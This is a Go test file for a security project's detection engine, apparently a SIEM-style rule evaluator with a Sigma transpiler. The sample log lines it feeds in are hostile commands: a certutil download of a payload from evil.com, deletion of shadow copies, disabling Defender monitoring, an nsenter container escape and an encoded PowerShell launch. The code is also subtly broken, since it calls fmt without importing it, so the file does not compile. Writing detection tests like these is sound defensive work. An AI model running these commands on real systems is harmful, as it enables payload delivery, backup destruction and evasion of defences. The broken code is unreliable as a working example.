package detection_test

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/kingknull/oblivrashell/internal/detection"
	"github.com/kingknull/oblivrashell/internal/logger"
)

// ── helpers ───────────────────────────────────────────────────────────────────

func newTestEvaluator(t *testing.T) *detection.Evaluator {
	t.Helper()
	log := logger.NewStdoutLogger()
	ev, err := detection.NewEvaluator(filepath.Join("..", "detection", "rules"), log)
	if err != nil {
		t.Fatalf("NewEvaluator: %v", err)
	}
	return ev
}

func evt(eventType, user, ip, host, rawLog string) detection.Event {
	return detection.Event{
		EventType: eventType,
		User:      user,
		SourceIP:  ip,
		HostID:    host,
		RawLog:    rawLog,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

// ── builtin rules ─────────────────────────────────────────────────────────────

func TestDetection_FailedSSH_FiresOnThreshold(t *testing.T) {
	ev := newTestEvaluator(t)
	e := evt("failed_login", "attacker", "10.0.0.1", "host-1", "Failed password for root")
	matches := ev.ProcessEvent(e)
	if len(matches) == 0 {
		t.Fatal("expected at least one match for failed_login, got none")
	}
	found := false
	for _, m := range matches {
		if m.RuleID == "builtin-4" {
			found = true
			if m.Severity != "medium" {
				t.Errorf("severity: got %q, want %q", m.Severity, "medium")
			}
		}
	}
	if !found {
		t.Error("builtin-4 (Failed SSH Login) did not fire")
	}
}

func TestDetection_CredentialDump_Critical(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("credential_dump", "root", "127.0.0.1", "srv-1", "lsass.dmp created"))
	assertMatchSeverity(t, matches, "credaccess_credential_dump", "critical")
}

func TestDetection_ShadowCopyDeletion(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("windows_process_create", "SYSTEM", "10.0.0.5", "win-1",
		"vssadmin.exe delete shadows /all /quiet"))
	assertMatchSeverity(t, matches, "windows_shadow_copy_deletion", "critical")
}

func TestDetection_PowerShellEncoded(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("windows_process_create", "user1", "10.0.0.2", "ws-1",
		"powershell.exe -EncodedCommand SQBFAFgAIAAo"))
	assertMatchID(t, matches, "windows_powershell_encoded")
}

func TestDetection_LolBin_Certutil(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("windows_process_create", "user1", "10.0.0.3", "ws-2",
		"certutil.exe -urlcache -split -f http://evil.com/payload.exe"))
	assertMatchID(t, matches, "windows_lolbin_execution")
}

func TestDetection_DefenderTamper(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("windows_process_create", "SYSTEM", "10.0.0.4", "ws-3",
		"Set-MpPreference -DisableRealtimeMonitoring $true"))
	assertMatchSeverity(t, matches, "windows_defender_tamper", "critical")
}

func TestDetection_DockerEscape(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("linux_process_create", "root", "172.17.0.2", "container-1",
		"nsenter --target 1 --mount --uts --ipc --net --pid -- bash"))
	assertMatchID(t, matches, "linux_docker_escape")
}

func TestDetection_LdPreloadHijack(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("file_write", "root", "192.168.1.10", "srv-2",
		"write /etc/ld.so.preload"))
	assertMatchID(t, matches, "linux_ld_preload_hijack")
}

func TestDetection_AWSRootLogin(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("aws_cloudtrail", "root", "1.2.3.4", "aws-mgmt",
		`{"EventName":"ConsoleLogin","UserIdentityType":"Root"}`))
	assertMatchID(t, matches, "cloud_aws_root_console_login")
}

func TestDetection_DCSync(t *testing.T) {
	ev := newTestEvaluator(t)
	matches := ev.ProcessEvent(evt("windows_ad_replication", "jsmith", "10.0.0.20", "dc-1",
		"GetNCChanges AccessMask 0x100"))
	assertMatchID(t, matches, "windows_dcsync_attack")
}

// ── deduplication ─────────────────────────────────────────────────────────────

func TestDetection_Deduplication_SuppressesRepeats(t *testing.T) {
	ev := newTestEvaluator(t)
	e := evt("credential_dump", "root", "10.0.0.1", "host-1", "lsass dump")

	first := ev.ProcessEvent(e)
	if len(first) == 0 {
		t.Fatal("expected match on first event")
	}

	// Immediately send a second identical event — should be suppressed by dedup window
	second := ev.ProcessEvent(e)
	for _, m := range second {
		if m.RuleID == "credaccess_credential_dump" {
			t.Error("duplicate alert fired within dedup window")
		}
	}
}

// ── threshold rules ────────────────────────────────────────────────────────────

func TestDetection_BruteForce_ThresholdAggregation(t *testing.T) {
	// The builtin SSH failure rule has threshold=1, so it fires per event.
	// Use a custom rule with threshold=5 to test aggregation.
	tmpDir := t.TempDir()
	writeRule(t, tmpDir, "brute_test.yaml", `
id: "brute_test"
name: "Brute Force Test"
severity: "high"
type: "threshold"
threshold: 5
window_sec: 60
conditions:
  EventType: "failed_login"
  source_ip: "10.99.99.99"
`)
	log := logger.NewStdoutLogger()
	ev, err := detection.NewEvaluator(tmpDir, log)
	if err != nil {
		t.Fatalf("NewEvaluator: %v", err)
	}

	// Send 4 events — should not fire
	for i := 0; i < 4; i++ {
		matches := ev.ProcessEvent(evt("failed_login", "victim", "10.99.99.99", "host", "fail"))
		for _, m := range matches {
			if m.RuleID == "brute_test" {
				t.Errorf("fired too early at event %d", i+1)
			}
		}
	}

	// 5th event — must fire
	matches := ev.ProcessEvent(evt("failed_login", "victim", "10.99.99.99", "host", "fail"))
	assertMatchID(t, matches, "brute_test")
}

// ── CIDR matching ──────────────────────────────────────────────────────────────

func TestDetection_CIDRCondition_MatchesRange(t *testing.T) {
	tmpDir := t.TempDir()
	writeRule(t, tmpDir, "cidr_test.yaml", `
id: "cidr_test"
name: "CIDR Test"
severity: "medium"
type: "threshold"
threshold: 1
window_sec: 60
conditions:
  EventType: "failed_login"
  source_ip: "cidr:10.0.0.0/8"
`)
	log := logger.NewStdoutLogger()
	ev, err := detection.NewEvaluator(tmpDir, log)
	if err != nil {
		t.Fatalf("NewEvaluator: %v", err)
	}

	// IP in range — should fire
	m1 := ev.ProcessEvent(evt("failed_login", "u", "10.5.6.7", "h", "fail"))
	assertMatchID(t, m1, "cidr_test")

	// IP outside range — should not fire
	m2 := ev.ProcessEvent(evt("failed_login", "u", "192.168.1.1", "h", "fail"))
	for _, m := range m2 {
		if m.RuleID == "cidr_test" {
			t.Error("CIDR rule fired on IP outside range")
		}
	}
}

// ── Sigma transpiler ──────────────────────────────────────────────────────────

func TestSigmaTranspiler_BasicRule(t *testing.T) {
	yaml := []byte(`
title: Test PowerShell Encoded
id: test-001
description: Test rule
status: stable
level: high
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains: '-EncodedCommand'
  condition: selection
`)
	rule, err := detection.TranspileSigma(yaml)
	if err != nil {
		t.Fatalf("TranspileSigma: %v", err)
	}
	if rule.Severity != "high" {
		t.Errorf("severity: got %q, want high", rule.Severity)
	}
	if len(rule.MitreTechniques) == 0 {
		t.Error("expected at least one MITRE technique from tags")
	}
}

func TestSigmaTranspiler_DeprecatedRuleRejected(t *testing.T) {
	yaml := []byte(`
title: Old Rule
status: deprecated
level: low
logsource:
  product: linux
detection:
  keywords:
    - 'old pattern'
  condition: keywords
`)
	_, err := detection.TranspileSigma(yaml)
	if err == nil {
		t.Error("expected error for deprecated rule, got nil")
	}
}

func TestSigmaTranspiler_MissingConditionRejected(t *testing.T) {
	yaml := []byte(`
title: No Condition Rule
status: stable
level: medium
logsource:
  product: windows
detection:
  selection:
    EventType: 'test'
`)
	_, err := detection.TranspileSigma(yaml)
	if err == nil {
		t.Error("expected error for missing condition, got nil")
	}
}

func TestSigmaTranspiler_TimeframeConversion(t *testing.T) {
	cases := []struct {
		tf   string
		want int
	}{
		{"30s", 30},
		{"5m", 300},
		{"2h", 7200},
		{"1d", 86400},
		{"", 0},
	}
	for _, tc := range cases {
		yaml := []byte(`
title: Timeframe Test
status: stable
level: medium
logsource:
  product: linux
detection:
  keywords:
    - 'test'
  condition: keywords
timeframe: ` + tc.tf + `
`)
		rule, err := detection.TranspileSigma(yaml)
		if err != nil {
			continue // empty timeframe produces 0 — skip
		}
		if rule.WindowSec != tc.want {
			t.Errorf("timeframe %q: got %d, want %d", tc.tf, rule.WindowSec, tc.want)
		}
	}
}

// ── rule loading ──────────────────────────────────────────────────────────────

func TestEvaluator_LoadsBuiltinRules(t *testing.T) {
	ev := newTestEvaluator(t)
	rules := ev.GetRules()
	if len(rules) < 50 {
		t.Errorf("expected ≥50 builtin rules loaded, got %d", len(rules))
	}
}

func TestEvaluator_LoadSigmaDirectory_CountsRules(t *testing.T) {
	tmpDir := t.TempDir()
	for i := 0; i < 5; i++ {
		writeRule(t, tmpDir, fmt.Sprintf("rule_%d.yaml", i), fmt.Sprintf(`
title: Rule %d
status: stable
level: medium
id: test-%d
logsource:
  product: linux
detection:
  keywords:
    - 'pattern-%d'
  condition: keywords
`, i, i, i))
	}
	log := logger.NewStdoutLogger()
	ev, _ := detection.NewEvaluator(t.TempDir(), log)
	_ = ev.LoadSigmaDirectory(tmpDir)
	if len(ev.GetRules()) < 5 {
		t.Errorf("expected ≥5 rules after loading sigma dir, got %d", len(ev.GetRules()))
	}
}

// ── helpers ───────────────────────────────────────────────────────────────────

func assertMatchID(t *testing.T, matches []detection.Match, id string) {
	t.Helper()
	for _, m := range matches {
		if m.RuleID == id {
			return
		}
	}
	t.Errorf("expected match for rule %q, got: %v", id, matchIDs(matches))
}

func assertMatchSeverity(t *testing.T, matches []detection.Match, id, severity string) {
	t.Helper()
	for _, m := range matches {
		if m.RuleID == id {
			if m.Severity != severity {
				t.Errorf("rule %q: severity got %q, want %q", id, m.Severity, severity)
			}
			return
		}
	}
	t.Errorf("expected match for rule %q, got: %v", id, matchIDs(matches))
}

func matchIDs(matches []detection.Match) []string {
	ids := make([]string, len(matches))
	for i, m := range matches {
		ids[i] = m.RuleID
	}
	return ids
}

func writeRule(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatalf("writeRule %s: %v", name, err)
	}
}

// fmt import for writeRule helper
var _ = fmt.Sprintf
